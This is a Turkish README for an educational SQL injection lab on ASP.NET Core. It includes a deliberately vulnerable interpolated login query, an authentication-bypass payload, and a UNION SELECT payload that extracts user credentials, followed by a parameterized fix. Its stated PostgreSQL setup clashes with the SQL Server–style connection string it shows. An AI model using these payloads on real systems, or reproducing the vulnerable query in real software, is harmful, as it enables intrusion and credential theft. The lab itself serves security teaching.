# 🔐 SQL Injection Lab
ASP.NET Core + PostgreSQL üzerinde SQL Injection saldırılarını anlamak, istismar etmek ve güvenli kodlama pratiklerini öğrenmek için hazırlanan eğitim projesi.

## 🎯 Amaç
Bu laboratuvar ile:
- SQL Injection’ın nasıl oluştuğunu öğrenirsiniz.
- Güvensiz kodları istismar edersiniz.
- Parametrik sorgularla güvenli kodlamayı görürsünüz.
- Bir saldırganın veritabanına nasıl eriştiğini deneyimlersiniz.

## 📁 Proje Yapısı
```
SqlInjectionLab
│   SqlInjectionLab.sln
└───SqlInjectionLab
    ├── Controllers
    ├── Data
    ├── Models
    ├── Services
    ├── Views
    └── wwwroot
```

## 🚀 Çalıştırma
### Veritabanı
`appsettings.json` içinde connection string’i düzenleyin:
```json
"ConnectionStrings": {
  "DefaultConnection": "Server=.;Database=SqlInjectionLab;Trusted_Connection=True;"
}
```
Ardından:
```
dotnet ef database update
```

### Uygulama Başlatma
```
dotnet run --project SqlInjectionLab
```

## 🧪 Senaryolar
### 1. Kırılabilir Login
```csharp
var sql = $"SELECT * FROM Users WHERE Username='{username}' AND Password='{password}'";
```
Payload:
```
' OR '1'='1
```

### 2. Ürün Arama Açığı
```
%' UNION SELECT id,username,password FROM Users --
```

### 3. Güvenli Kod
```csharp
_db.Users.FromSql($"SELECT * FROM Users WHERE Username = {username}");
```

## ⚠ Etik Uyarı
Bu proje yalnızca eğitim amaçlıdır.

## 📚 Kaynaklar
- OWASP SQL Injection Cheat Sheet
- NIST Secure Coding Guidelines
